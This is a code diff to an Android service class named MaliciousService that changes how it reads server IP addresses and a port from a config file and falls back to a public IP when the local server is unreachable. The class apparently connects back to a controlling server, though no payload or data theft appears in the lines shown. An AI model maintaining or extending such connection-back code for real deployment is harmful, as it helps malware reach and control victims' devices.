@@ -269,9 +269,14 @@ public class MaliciousService extends Service {
             is.close();
             
             // Get properties from the [SERVER] section
-            String localIp = props.getProperty("LOCAL_IP");
-            String publicIp = props.getProperty("PUBLIC_IP");
-            String port = props.getProperty("PORT");
+            String localIp = props.getProperty("SERVER.LOCAL_IP");
+            String publicIp = props.getProperty("SERVER.PUBLIC_IP");
+            String port = props.getProperty("SERVER.PORT");
+            
+            // If not found with section prefix, try without it (backward compatibility)
+            if (localIp == null) localIp = props.getProperty("LOCAL_IP");
+            if (publicIp == null) publicIp = props.getProperty("PUBLIC_IP");
+            if (port == null) port = props.getProperty("PORT");
             
             Log.d(TAG, "Read from config.ini: LOCAL_IP=" + localIp + ", PUBLIC_IP=" + publicIp + ", PORT=" + port);
             
@@ -281,13 +286,17 @@ public class MaliciousService extends Service {
                 saveServerConfigToPreferences(localIp, port, port);
                 
                 // Schedule a check to try public IP if local fails
+                final String finalLocalIp = localIp;
+                final String finalPublicIp = publicIp;
+                final String finalPort = port;
+                
                 Handler handler = new Handler();
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        if (!isServerReachable(localIp, port) && publicIp != null && !publicIp.isEmpty()) {
-                            Log.d(TAG, "Local IP unreachable, switching to public IP: " + publicIp);
-                            saveServerConfigToPreferences(publicIp, port, port);
+                        if (!isServerReachable(finalLocalIp, finalPort) && finalPublicIp != null && !finalPublicIp.isEmpty()) {
+                            Log.d(TAG, "Local IP unreachable, switching to public IP: " + finalPublicIp);
+                            saveServerConfigToPreferences(finalPublicIp, finalPort, finalPort);
                         }
                     }
                 }, 5000); // Wait 5 seconds before checking
